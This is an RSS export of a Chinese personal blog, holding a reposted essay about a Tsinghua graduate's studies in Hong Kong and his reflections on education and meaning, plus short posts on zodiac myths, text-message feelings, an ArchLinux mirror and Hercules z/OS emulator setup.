style="line-height: 22px;"  >十一回，聪明地跑</div><div style="line-height: 22px;"  >宙斯妹妹的女儿，是个倒酒的，很聪明地通过嫁人的方式摆脱了这个差事，宙斯就抓了一个长得比自己帅却不听话的王子做这工作，并且不发工资（没有为王子设立什么座，反而为装酒的瓶子设了），水瓶座</div><div style="line-height: 22px;"  >十二回，<span style="line-height: 22px;"  >傲</span><span style="line-height: 22px;"  >娇地跑</span></div><div style="line-height: 22px;"  ><span style="line-height: 22px;"  >摩羯事件之后，众神又K歌，又遇见妖怪，又无节操地鸟兽散，其中有两个母子关系的神，变成鱼并把尾巴绑在一起，大家都觉得这个逃跑地方法比较有创意，就设了双鱼座</span></div><div><br></div><div style="line-height: 22px;"  ></div></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201313105057288/</guid>
    </item>
    <item>
      <title>
<![CDATA[ArchLinux]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010111672953542/</link>
      <description>
<![CDATA[<pre>Server = http://mirrors.163.com/archlinux/archlinux/$repo/os/i686 </pre>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010111672953542/</guid>
    </item>
    <item>
      <title>
<![CDATA[一个清华学生在香港留学受到的心灵震憾[转贴]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007864364374/</link>
      <description>
<![CDATA[<TABLE cellSpacing=0 cellPadding=4 border=0>
<TBODY>
<TR>
<TD style="PADDING-TOP: 10px" vAlign=top height="100%">
<DIV style="FONT-SIZE: 12px"><BR>98年本科毕业，又顺利地被保研，当时的我只是一个憨憨的书呆子，纯洁的如同高中生，在清华这种和尚庙一般的理工学校里呆了四年，女孩似乎是山下的老虎，神秘得让我一见就脸红心跳。未来是什么对于我就是“读完研再说”，反正成绩还行，不读白不读。天上掉了馅饼，用我的兄弟的话来说。香港正好回归一周年，教育部要选派一批本科毕业生去香港科技大学读研，以加强两地的教育和科研交流。清华当然要占不少名额，系里的几个牛人去了美国，所以这个饼就掉到了我头上，确实是个不错的饼，不用考G、考托、 全额奖学金，连什么手续都是学校和教育部包办了，我分文不花，后来香港科大的联络人抱怨中国的办事效率和程序烦琐，至于怎样的麻烦过程，我至今都一无所知。 <BR><BR>香港科大 <BR><BR>就这么糊里糊涂地来到了香港。依山傍海的科技大学美得如同世外桃源，现代感的建筑更让我们爽眼。当时的一个哥们说：“妈的，就是用银子在荒山野岭堆出来的，这样的物质条件算是让我满足了。”后来得知就是亚洲最美丽校园，倒也丝毫不怀疑。据说是香港政府感到了贸易和服务的优势正受中国沿海城市的挑战，而科技就是竞争力，就下了狠心投钱建了这学校，请来了学者。耗资400亿港币，相当于微软公司一年的纯利。组织的参观，教授的讲话，英语的培训很快就过去了，当时的新奇兴奋也褪得干净，每天面对这青山海景，最后也麻木得没有感觉了。由此可以推测娶一个漂亮老婆是没有多大意义的，如果不是为了炫耀。教授大多是华人，台湾和大陆出身的不少，反倒香港人是少数派，很多都是在北美的名校里拿了PhD,奔这里的高薪来了，他们的PhD头衔总要和名字相片挂一起， 挂一辈子， Harvard和Standford之类的当然就香了。正教授可以一年拿到一百多万港币，也就是一个月可以买小汽车，比一般的美国大学高。知识真的值钱了，让我们充满了对未来的向往。有回和教授们吃饭，谈及大陆大学教授的待遇，他们就感慨：“知识分子真被廉价到了可耻的地步。”我们也无话可说，反正不是我的错。然而钱不是好拿的，很多教师正是三十出头，教授职称还未到手，和学校只是几年合同，其他的学者也不断在申请进来，所以压力颇大，辛勤程度比公司打工仔有过之而无不及。既然自己做学问要紧，培养学生的事就要往后排了。刚近来时很多教师和我们亲切讲话，之后就不见了，好久不见就不认得。研究生当然有导师的，只要自己不去找他，他是肯定不会找我的。上课之后就是绝对的自由，当时自由得很是惬意。 <BR><BR>萧伯纳说人生的苦闷有二，一是欲望没有被满足，二是它得到了满足。这话的确是部分的真理。当我住在这绝世美丽的地方，可以随心所欲的去商店买东西不用担心付不起帐，可以任意的支配自己时间时，最初的半年里，却发现情绪每况愈下。西方化的建筑设计将个人的所谓 privacy保护发挥到极致，进了宿舍就基本感觉不到他人的存在，同单元的人也有独立的卧室，大家都是进了房，将门一关，隔离了，谁也不好意思去敲门。刚来时认识的一伙人，后来发现根本遇不着，如同消失了一般。同住一起的是三十好几的叔叔级人物，偶尔可以说上一两句话，却永无可能说很多。大家都像是住在不同的空间里做研究，忙碌的无瑕顾及他人。 <BR><BR>平心而论，对于一个成熟的研究者，如果他有确定的目标和兴趣，对生活人生都不再有不切实际的幻想，准备投身科学研究中，那么这里真是一个好环境。但是我种茫茫睁着无知的眼睛的毛头小子，却是完全另外的感觉。 那种茫然的苦闷感觉真是难以描述，找不到人玩，只是将窗户开了又关，关了又开，不停的喝水，仍然感觉不舒服。怀念在清华的破楼里相互串门打闹的日子，怀念抱着篮球在走廊里叫一声就应者云集的日子，可是怀念解决不了问题。以孩子的心理去进入成熟严谨的环境，不可不说是一次考验。 <BR><BR>多年的功利教育的辛勤培养，我一路顺当地走过来，发现完全的上当。我在成功的通过了一次次考后，最终都不知道我为什么要通过这些占距人生的考试，这个所谓的优秀学生只是在不停地让自己去符合那个“优秀”的外在标准来麻痹自己的虚荣心，而自己，那个真正的自己却一直没有存在过，没有发育过。我学的任何课程都无法帮我解决当时的苦恼，那么每天学那些微分方程又是为了什么？还去为了父母的微笑，人们的赞许吗？年年得奖学金的清华毕业生是了这么一个怪物：不知道自己要什么，也不知道生活是什么，对社会毫无接触，二十出头，可是见女孩子就一身不自在，会解各式各样的方程，却不能解决自己的困惑，硕士博士的路就在眼前，可是不知道还应不应该这样走下去，这状态难道就是我的追求？一个智商还不错的人努力多年就变成这样？ <BR><BR>这是一个问题，很早就有了，只不过太晚地暴露出来，我相信这样的问题依然将被很多师弟师妹们面临，我相信在清华依旧有很多像我当年一样的学生。当看到他们天真的讨论： G 2***, 托 6**，GPA 3.*, 学校名次Top **, 仿佛几年的辛劳就只为那么点数字，人生的终极标就是 go abroad. 我无法不为他们忧虑。这也是促使我写这篇文章的主要原因。 <BR><BR>很多人没有对做研究的真正兴趣，但是用尽了精力去获得一个去国外做科学研究的机会，就洋溢在掩饰不住的喜悦里，甚至对人生毫无真正规划，对自己的兴趣一无所知，为出国而出国，那将在告别父老乡亲后去迎接苦闷的开端。 <BR><BR>香港的学生很实际，决大多数本科毕业就去赚钱，三十之间为结婚买房奋斗，如果告诉一个香港人说你二十八了还在读博士，他会觉得你很失败，可能是根本不会赚钱。而留下来读博士的香港学生，就是真的很喜欢作研究的人，扎实地做事，他们的认真让我们一批朝三暮四，心猿意马的大陆学生汗颜。 <BR><BR>生活在香港 <BR><BR>都说香港是弹丸之地，其实一千多平方公里的面积也不算小，不过大多是山，可利用的地方不多，很多商业区都是添海造出来的。亚热带的气候，又在到处是山和海湾的地方，风景当然好。香港的气候比北京舒适一万倍，冬天冷不了，夏天也不太热，甚至没有明显的四季感。只是上半年天气有些潮。成天都有湿湿的感觉，北方人有点受不了。 <BR><BR>香港的交通极其发达，公共车从不拥挤，也很少堵车，可是香港的道路比北京的窄得多，车也不会少，布局和管理更好而已，看来北京走向国际化还须努力。这里是名符其实的购物天堂，东西也不算贵，电器和服装可能比北京便宜，特别是国际名牌，由于没有关税，肯定要比大陆便宜。所以不必带很多衣服来，足够便宜了。但是服务业，比如吃饭，理发，涉及到员工劳动和地租的就要比大陆贵好几倍。可以随便往来深圳也是在香港的一大好处，一天可以轻松来回好几次，在香港读书的学生可一得到香港的临时身份证，加上护照上盖个章，就可以自由出入境了。<BR><BR>常有人问及香港的影视明星，可是到了香港就觉得那些人也只是打工仔，背后是更有影响力的老板，一旦老板不想捧了，明星就会很快消失，新人会取而代之。看到他们卖力地载歌载舞，其实也是生存需要，在商业社会里那是绝对的驱动力。 <BR><BR>香港的金融和资讯服务相当发达，在所谓第一世界里也算相当突出，可以很便宜的享受到信用卡，电讯，互联网服务，因此有些人在香港呆久了再回来反而不适应了，主要就是这些方面，当然还有其他制度等软件原因。 <BR><BR>说到学校的生活，物质条件比国内任何大学好，甚至条件好过美国不少学校，香港的学生很少住宿学校，所以一到周末放假学校就很冷清。通常大陆学生独享学校设备，偌大电脑房和运动场，舒服的游泳池，都有不少美好回忆。学生宿舍条件不错，可以作饭，自己作比在餐厅里吃来的便宜，所以大陆学生会乐此不疲，周末常三五成群，作吃的为乐。餐厅里中西餐都有，中餐以广东口味为主，忙起来时以营养为重，口味不对也只能将就吃了。 <BR><BR>现在在香港的大陆学生不算多，总共有四五百人，各个学校都有学生联谊会，是比较松散的组织，也有一些机会认识朋友。周末会组织放放电影，搞舞会。临近考试或论文时，谁也没心思搞活动。香港的学生很好打交道，在成熟的社会里长大的人，心理相对简单且好玩，不像一些大陆学生常常过分盘算自己的明天，将自己逼的很累。他们对大陆也渐渐感兴趣，虽然他们常常不知道湖南和四川，只说得上秦始皇和毛泽东。只要主动点和他们交流，是可以结识不少朋友的，粤语不是障碍，很多人可以听普通话，而且，广东话不难学，不留神就长进不少。 <BR><BR>关于工作机会 <BR><BR>很多人就终于跳到北美去了，大多还是接着读书，从这个意义上讲，香港只是跳板。在香港留下工作的机会不多，如果在进香港的第一天了解这一点，是有好处的。也有回祖国的，我就是，所以我在这里写文章了，看到很多朋友询问去香港读书的问题，作为过来人，就写了这些，如果能给这些朋友提供一点有益的信息，就很满足了。 <BR><BR>上次写了文章发表在海外学子版，很多朋友给我回信，给了我很大的鼓励，真的没想到过自己的东西会给别人带来影响。留学的经历给了我很多，几乎是一个脱胎换骨的过程，在一篇文章里是不可能都讲完的，所以我再写一个续集，好莱坞搞续集纯是为赚钱，我呢是什么都不图，万一有 ppmm看了之后找我，最爽不过。将心底里的一点点“龌龊” 都暴露出来，可以痛快讲了。 <BR><BR>凡事都是虚空 <BR><BR>来自发展中国家的人，难免在神情上都多一丝生存紧张，中国在海外的留学生尤其让人感觉到这一点。看不到出自内心的笑，连谈话时也似乎只有一个主题：今后有什么打算？每做一件事，都在问自己：对我有没有好处？ <BR><BR>坦白的说我自己刚到香港时就是这样，只觉得自己多么没着落，无根无底的飘在他乡，我要努力啊，绝不可浪费自己的任何精力，房子，车子，名誉，地位，还有漂亮老婆，我什么都要啊。要学最能给我带来利益的东西，去做最有利自己的事情，直到我成功。 <BR><BR>当时我就是这么典型一????, 到现在我都想这样痛骂自己。 <BR>数学指出函数的极大值往往在最不稳定的点取到，人追求极端就会失去内心的平衡，到时候就不难体会到数学原理的深刻。我很快让我的????心理逼到无路可走了，对所学的东西怀疑，担心自己变成书呆子，对自己有信心，找不到真正的朋友，找不到让身心平静的乐趣，每天都在心潮起伏。最后我去找学生辅导员。愚蠢的诉说倒不多提了，不过我记得他大胡子的脸有了微笑，眼睛里放出宽容而温和的光。他告诉我觉的我很有意思，他第一次遇到这么坦白的学生。“那些东西有什么意义呢，你怀疑得很好。“之后就翻出圣经来，给我读某些章。Everything is meaningless.竟是圣经里的话语。 那是我看到的最为震惊的一句话，也是我后来觉得最深刻的一句话。中国人很难理解，对在功利教育里熏陶过来，缺少人格教育的中国学生，更无异于晴天霹雳。 成绩，offer, 学位，这样那样的好处，每天拼命算计的东西有什么意义？假设你突然死掉，世界将会怎样？世界将一样绚丽，地球转的一样快，太阳系每天在宇宙中换一个位置。大海还是大海，波涛还是波涛，一样的花开花落，潮起潮落。你的亲人可能会掉眼泪，但是周围的人在三个月内将你忘个干净，那是你曾经那么在乎他们怎么看你的一群人啊。如果上帝存在，在他的眼里，你是多么可怜的小虫子，在活着的短暂岁月里，在最美好的青春里，都不曾快乐过，用尽心力去聚集一大堆外在和心灵没有关系的小东西，只是出于对未来的没有信心，小小的心灵在接近熄灭的一天还在发出那个愚蠢的声音，让你忙碌，让你忧虑的声音：我要，我还要。天底下充满了这样的小虫子，当一个离开了，又有一个来了，做着同样的事情，汹涌着同样的小小念头，受着同样的煎熬。 于是上帝要感慨了：虚空的虚空，凡事都是虚空。已有的事，后必再有；已行的事，后必再行。日光之下，并无新事。已过的时世代，无人纪念；将来的世代，后来的人也不纪念。 <BR><BR>------圣经 旧约 传道书 <BR>我不是在传教，当时的辅导员也不是在传教，但是让我立刻看到自身的渺小，物质追求的虚妄，内心的愚昧。看看资本主义的学生辅导，是不是比我们这边高明多了？马哲曾帮助过我们什么？ <BR><BR>不要忧虑 <BR><BR>“不要为明天忧虑，天上的飞鸟，不耕种也不收获，上天尚且要养活它，田野里的百合花，从不忧虑它能不能开花，是不是可以开得和其它一样美，但是它就自然的开花了，开得比所罗门皇冠上的珍珠还美。你呢，忧虑什么呢？ 人比飞鸟和百合花贵重多了，上帝会弃你不顾吗？” <BR><BR>一个朋友告诉我，他在等美国 offer 的时候，常常梦到接到牛校offer, 过度兴奋到醒，更为郁郁，感慨 “但愿长醉不复醒”。 这样的故事大家听了不会太惊诧，由此不难理解《儒林外史》中的进中举了。 而得到offer的人到了海外，往往要经历更多的梦醒时分。 <BR><BR>为什么活得这么累？ 生命本是如此美丽，连飞鸟和野花都可以尽情地享受上天的恩赐，而这些有高等思维的聪明人，却活活让思维搞得神情郁郁，哀声叹气。 <BR><BR>常有人感叹西方人笑起来那么真实，那么出自内心，探讨起来，又归结到他们更有钱，他们的社会更发达。可我觉得那不是原因。原因就是他们比中国学生更接近飞鸟和野花罢了，更接近《阿甘正传》里的弱智罢了。他们更天真，相信那个万能的上帝会永不遗弃他，所以他们可以少想很多的问题，反而过得更顺利，在团队里表现得更凝聚，因为过分的私心是无法向大家共同的上帝交代的，他们可以很快做出一个Microsoft，一个Dell，但是大家可以看看中国的北大方正，联想，新浪， 管理层一年的地震比台湾还多, 这么多年来，连冲出亚洲的野心都没有真正实现过。 这难道不是上帝给西方人带来的好处，耶稣说信我就可以得救，不管这个上帝是不是虚拟的，但他在事实上填补了人性的巨大空白，人家的Microsoft 就证明了他的存在，正如计算机的虚拟内存，尽管虚拟，但事实上的作用是巨大的。中国学生总是怀疑这个看不见的上帝是否存在，更在私下里说，他对我能带来好处吗？其实中国人什么都不信，只信好处，从古时的考八股起，读书就是为了好处。因此，大家每天活在害怕没有好处的忧郁里，想靠自己小小的思维，在着巨大的世界系统里去谋取好处，上帝忍了泪水，背过脸去。 <BR><BR>思维的无奈 <BR><BR>我并不主张虚无，尽管我在上一篇文章里尽力去指出物质追求的虚妄。正如萨特认为，人生本是本无意义，但是怎样摆脱虚无却是有意义的。王朔的意义在于砸碎那些没有意义的假崇高，伍迪.艾伦的意义就在于不断指出人生的荒谬。如果一切都是那么可笑，我们怎样面对每天的24小时？ 但是活着就是这么简单，它只是一个过程，简单而自然地发生，以至于任何干扰和关注都是多余。就像飞鸟掠过天空，野花静静地开放。能把什么东西叫做现在吗？你能占有什么东西吗？一切的意义只在时间的流动的河中。就像一团火，哪个燃烧的过程才叫火，一旦过程停止了，火不存在了。人的思维在作怪，它是一个双面的东西，它不总是带给我们好处，虽然我们对它有那么多自信。 思维在很多时候严重地干扰了那个自然的生命过程，它在想单个的状态好不好，值不值得，合不合规范， 能给自己带来什么，所以我们很快变得不快乐，不安稳，再也无法享受那种自然的喜悦了，正像被摄像的人，他的表情立刻不自然起来。恐怖片里的鬼魂可能一直不曾出现，人们却开始牙齿打颤，是被自己思维折磨而已。学计算机的朋友肯定知道操作系统将一个进程悬挂起来的意思。人的那个蠢笨不堪的思维，凭什么要常驻内存？它那么长期的运转，又真正解决了多少问题？为什么不在必要的时候悬挂它，去享受生命的自然？ 明白这一点将改变你的生活，思维会使你陷入矛盾，很多时候它是多余的，用心去体会，甚至用毛孔去感受就足够了。当你不再判断，不再分辨，不再比较，不再权衡，你就立刻、和谐起来。“采菊东篱下，悠然见南山”。那时，还用考虑什么呢？“此间有真意，欲辩已忘言”，连言语都是多余，因为言语来自思维。佛陀的捻花一笑，详和的神情，虽静坐，似乎已飞跃世间一切，他坐在了那个生命的根本之上, 再也没有一丝的不和谐。 <BR><BR>读书的时候，我常常到海边听滔声，坐下来看着太阳落下，那会是我一天最美好的时间，当太阳没下去，晚霞渐渐褪去颜色，波浪依然轻轻拍打岸边，幕色从四周将我围过来，静默中我会在心灵里升起喜悦，感觉到冥冥中那个永恒的力量，它在紧紧将我抱住，天地万物和我一样同在，也被温和地抱着，我将永不孤独，永不伤心，永不绝望，因为那力量就一直在那里，将永远在那里，我是它的恩赐，我的灵魂从未像那时一样枝繁叶茂，内心从未像那时一样宁静和谐。 <BR><BR>我不用去分辨那种力量，是上帝也好，上天也好，老子说的道也好，有什么关系呢？分辨只是是思维常干的蠢事罢了。所有的心灵都是一样的，所以我相信所有人都有那个和谐的状态，就像收音机有那个频道一样，只不过太多人没有调到过。太阳，大海，清风明月，鸟语花香，生生不息的物种，是多么大的恩赐啊，只在我们断暂的生命里才可以感受到，可是太多的人从不念及。他们将自己全部地交给了少得可怜的脑细胞，心灵交给了那个拙劣的 CPU, 时时刻刻在做狭窄不堪的运算和判断，所以才会长时间挣扎焦虑，只看到85分和90分的区别， 5000元月薪和10万年薪的不同，牛校和烂校的分辨。所以“郁闷”，“无耻”，“倒霉”，“不爽”，“急”，这样的词汇就开始在嘴边泛滥了，就像破电脑的出错提示一样多。 <BR><BR>我在香港学习的日子（之四） <BR><BR>本没有打算再写很多了，关于人生的刨根问底本来就是沉重的课题，无异让学业繁多的学子们再怀疑自己，平添忧虑。倒不如多说点逗乐的事，每天多嘻嘻哈哈一阵。前不久见到北大的一个女生，说我前面介绍香港的文字很实用，后面的文章就越来越看不懂了，可以理解，并不是所有的人都要像我一样想这些问题的，特别是女孩，一天多说几声“挺好的”“好温馨哟”就算过得不错了，古今中外都不曾出过一个女哲学家。 <BR><BR>但是，这位未曾谋面的北大师弟在等我的续集，谢谢你，xmdl(阿扁鱼）, 我不愿让你失望这一篇是为你而写的。 <BR>我们看的人文书 <BR><BR>前面提到的女生就问我，在留学过程中最大的收获是什么，我回答是长了见识。就像在小地方呆久的人出来见了大海，这个收获大得很。所以我渐渐地学会了真正的谦虚态度，越来越承认自己所可以理解到的，可以认识到的只是这世界的太小一部分。在我的脑力范围外有太大的空间，从这一点来看，我们每个人都对自己有过多的自负，每天都在或多或少的干着作井观天的蠢事，争论着盲人摸象的争论。 <BR><BR>清华北大的学生的人文素养，我想，很多来源于图书馆的人文书籍，因为喜欢读书的学生多半在那里搬书回来看。可是那些书多产于七十，八十年代，基本上是被一把姓马的刀阉割了的太监式的书，我不怕得罪人。怎么阉割法？举个例子，“总体而言，宗教是唯心的，错误的世界观，被统治阶级利用来麻痹被统治阶级的广大人民...”从此，你知道了这一点，你么读释迦，读耶稣，读老庄，都觉得如同太监一般阴阳怪气。在红色的年代里，马刀所向无敌，包括孔夫子到孙中山，从曾国藩到蒋介石，都少有可以逃脱的，因为他们有“阶级局限性”。<BR><BR>但是我到了香港，就看到了很多台湾的书，很多香港的书，原来这些书本不象太监的，甚至不比姓马的书少阳刚之气，可以读得让人忘食，哎，可怜它们的被阉。这些都是我以前脑子以外的东西，所以我立刻知道要谦虚了，人总是受着他的经历和环境的巨大局限，他甚至不意思到，没有选择地被限制隔离着。 <BR><BR>耶稣呢，用我们的眼光看，他太失败了，没有妻子，没有儿子，没有房子，没有财产，没有地位，最后还要被钉死，他只是游走于四方去救助受苦受难的人们，他有余的眼光总是看到了世界的外面，因为他也到过更高的维度里。<BR><BR>庄子至今看来还是活得最浪漫最洒脱的中国人，他是超脱的同义词，他也是高维空间的蚂蚁。 <BR><BR>去读他们，去体会那种来自另外一个维度的智慧的震撼，尽管你可能无法改变无奈的现实，但是可以深刻地改变自己，尽管无法摆脱沉重的肉身，依旧无选择地活在平面上，但是，心灵获得了自由。愿意升起你的心灵吗？ <BR><BR>我在香港学习的日子（之五） <BR><BR>每个人都是独一无二的，而且我们永远只能是自己，卢梭说的，对于整个世界我微不足道，但是我对于自己确是全部。事实上我们只对于自己重要，如果我死掉了，没有几个人会在三年后保持对我的记忆，如果我痛苦，没有几个人会有真正的同情，因为太难了，每个人都无法了解我的意识。 所以我们要独立，活着就是成为自己，那个独一无二的自己，去寻找自内在的完美与和谐，去实现句那没有选择的话： I am who I am。 Simply because I am not and can not be anyone else.可是我们受教育，教育的目的就是教我们忘掉自己，去变成一个称为标准的人，不是这样吗？从小学起我们就要评三好，树标兵，学雷锋，学赖宁。老师总是看到我们的恶习，“你那样子不合行为规范，不可耻吗？” <BR><BR>到了大学，我们又自由了多少呢？我们依旧看别人，看典型，看所谓成功者，我们依旧活在要忘掉自己的标准包围中，去bbs看看，似乎所有人都统一了口吻，GRE 2400, 拿了牛校offer, 签了著名外企，找到了ppmm, 牛啊，羡慕啊，爽啊, 历史走到了21世纪，北大和清华人只剩下一副面孔了，每年招了很多新生，最后就剩下了一个。 <BR><BR>比较是有意义的吗？作为一个独一无二的存在，作为自己的全部主宰，为什么要什么都和人家比才可以找到意义？为什么当别人考G的时候，我也一定要考，为什么考不过2200就要郁？为什么billgates 成功的时候，我也一定要学计算机？可是自己和别人是多么的不同，些不同难道可以在一些欲念的驱动下轻易的忽略？ <BR>崇拜是有意义的吗？明星是需要那样追捧的吗？中国的那支烂球队是需要那么多关注的吗？ <BR><BR>当我们倾注希望的时候，他们借此赚到了更多的银子，活得更加嚣张，更加让我们失望，我们是在给富翁们献爱心，爱心那么多，为什么不献给需要爱心的更多的人们，为什么不献给自己，独一无二的自己？ <BR><BR>当我们崇拜自己，热爱自己，追捧自己，关注自己，我们就都也是明星了。这样盲从将无法发生，起哄将无法发生，个人崇拜将无法发生。这个意义大的很，至少大跃进将不发生，文革将不发生，我们的经济有可能早三十年走上正轨，现在我们不需要拼命飞跃重洋，中央到地方的官员就不要象现在一样，在亿万人没有工作时还竭力吹嘘7%的GDP增长，就像阳痿的人，为了脸面，郑重地去声名：请看我浓密的胡须，年增长率7%！</DIV></TD></TR>
<TR>
<TD vAlign=bottom><BR><BR><BR><IMG alt="" src="http://bbs.gter.net/bbs/images/common/sigline.gif"><BR>
<DIV style="OVERFLOW: hidden; HEIGHT: 275px; max-height: 25em; maxHeightIE: "><FONT color=purple><FONT size=2>农民伯伯把玉米种到地里，到了秋天，收了很多玉米。 <BR><BR>农民伯伯把花生种到地里，到了秋天，收了很多花生。 <BR>　　 <BR>小猫看见了，说：“我把快乐种到地里，到了秋天，能收到很多快乐吗？” <BR><BR>“不能。” <BR>“为什么？” <BR>“都烂了......” <BR><BR>我就是那个傻猫，我傻傻地想：到了辣白菜起缸的时候，我的伤心就会结束</FONT></FONT></DIV></TD></TR></TBODY></TABLE>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007864364374/</guid>
    </item>
    <item>
      <title>
<![CDATA[ 那些你不懂的短信]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720091137218927/</link>
      <description>
<![CDATA[当你收到“你干嘛呢”<br>就等于“我想你了”<br><br>发“呵呵”多是没笑或傻笑<br>但如果我发的是“嘿嘿”“嘎嘎”或者“哈哈哈”这是你打过来我一定是在笑<br><br>每次骂你“傻子”“笨蛋”“死孩子”<br>都是关心 希望你照顾好自己<br><br>当多是问句结束时<br>是希望能在和你多聊一会<br>相反如果“嗯”“哦”一定是敷衍<br>在意的人我多会回复“收到”“遵命”“知道啦”之类的<br><br>有时催你睡觉或者让你忙自己的<br>其实心里并不想你真的那么做<br><br>把我的糗事 傻事 失落事告诉你<br>是希望你安慰我 照顾我 甚至骂骂我<br><br>主动发给你<br>一定是你在我心中有很重的分量<br>我很讨厌和不在意的人啰嗦<br><br>喜欢给你起外号的<br>是我希望可以让你多记住我一些<br><br>“我到家了放心吧”“你到家了告诉我一声”<br>是说明我进屋第一个想到的人是你希望你也如此或者你一定要一路平安我不许你有事<br><br>有时实在没话了又想发给你<br>就会假装发错人<br>好吧&nbsp; 我承认这很蠢……<br><br>有时看到很好的短信会忍不住转发给你<br>又不忍心 会偷偷把“转发10人会幸福哦”改成“转发2人会幸福哦”<br>凡是那种“不转发就会有不幸 就会失去爱人 就会家人危险的”<br>我会坚决不发给你<br><br>有一阵没发给你短信过<br>并不代表我没发出去的草稿箱里没有<br><br>还有<br>我晚上从不关机<br>就是希望<br>只要你需要我<br>我就在这儿<br><br><br>珍惜身边那些爱你的，你爱的人吧！希望所有的人都可以幸福~O(∩_∩)O~]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720091137218927/</guid>
    </item>
    <item>
      <title>
<![CDATA[hercules-zos16]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720079284532177/</link>
      <description>
<![CDATA[<P>1.安装hercules</P>
<P>2.下载zos16</P>
<P>3.hercules -f adcd6.cnf</P>
<P>4.启动一个3270终端</P>
<P>5.IPL 0A80</P>
<P>6.大概15分钟之后，启动成功</P>
<P>7.再启动一个终端登录为IBMUSER，初始密码IBMUSER，后被改为八位密码，hjxxxxxx。</P>
<P>8.用IBMUSER帐号添加一个USER</P>
<P>9.用ADCDA登录，初始密码TEST，改成和IBMUSER一样的帐号</P>
<P>10.创建源代码，JCL，LOAD数据集</P>
<P>11.编写COBOL的HelloWorld</P>
<P>12.编写COBOL编译JCL.出现错误，因为编译用的的一个PGM的HLQ不对，在3.4根据LLQ搜索*.SIGYCOMP.</P>
<P>13.运行COBOL程序。直接进入6：CALL 'ADCDA.LOAD(TEST)'</P>
<P>&nbsp;</P>
<P>附一：adcd6.cnf</P>
<P>#<BR># Hercules Emulator Control file...<BR># Description: zOS1.6<BR># MaxShutdownSecs: 15<BR>#<BR>#<BR># System parameters<BR>#<BR>CPUSERIAL 000000 <BR>CPUMODEL&nbsp; 9672 <BR>MAINSIZE&nbsp; 512 <BR>CNSLPORT&nbsp; 3270 <BR>NUMCPU&nbsp;&nbsp;&nbsp; 1 <BR>NUMVEC&nbsp;&nbsp;&nbsp; 1 <BR>ARCHMODE&nbsp; ESAME <BR>LOADPARM&nbsp; 0A82CS.. <BR>SYSEPOCH&nbsp; 1900 <BR>TZOFFSET&nbsp; +1400 <BR>OSTAILOR&nbsp; z/OS <BR>PANRATE&nbsp;&nbsp; 50 <BR>PGMPRDOS&nbsp; LICENSED <BR>IODELAY&nbsp;&nbsp; 1 <BR># Display Terminals<BR>0700&nbsp;&nbsp;&nbsp; 3270 <BR>0701&nbsp;&nbsp;&nbsp; 3270 <BR>0702&nbsp;&nbsp;&nbsp; 3270 <BR>0703&nbsp;&nbsp;&nbsp; 3270<BR>0704&nbsp;&nbsp;&nbsp; 3270<BR>0705&nbsp;&nbsp;&nbsp; 3270<BR>0706&nbsp;&nbsp;&nbsp; 3270<BR>0900&nbsp;&nbsp;&nbsp; 3270 <BR>0901&nbsp;&nbsp;&nbsp; 3270 <BR># DASD Devices<BR>0A80&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6RES1.A80<BR>0A81&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6RES2.A81<BR>0A82&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6SYS1.A82<BR>0A83&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6USS1.A83<BR>0A84&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6USS2.A84<BR>0A85&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6DIS1.A85<BR>0A86&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6DIS2.A86<BR>0A87&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6DIS3.A87<BR>0A88&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6DIS4.A88<BR>0A89&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6DIS5.A89<BR>0A8A&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6WAS1.A8A<BR>0A8B&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6WAS2.A8B<BR>0A8C&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6DB81.A8C<BR>0A8D&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6DB82.A8D<BR>0A8E&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6CIC1.A8E<BR>0A8F&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/Z6IMS1.A8F<BR>0A90&nbsp;&nbsp;&nbsp; 3390&nbsp;&nbsp;&nbsp; ./zos1_6/SARES1.A80<BR># CTC Adapters<BR>0E20&nbsp;&nbsp;&nbsp; CTCI&nbsp;&nbsp;&nbsp; 192.168.1.200 192.168.1.111<BR>0E21&nbsp;&nbsp;&nbsp; CTCI&nbsp;&nbsp;&nbsp; 192.168.1.200 192.168.1.111<BR>附二：COBOL编译JCL</P>
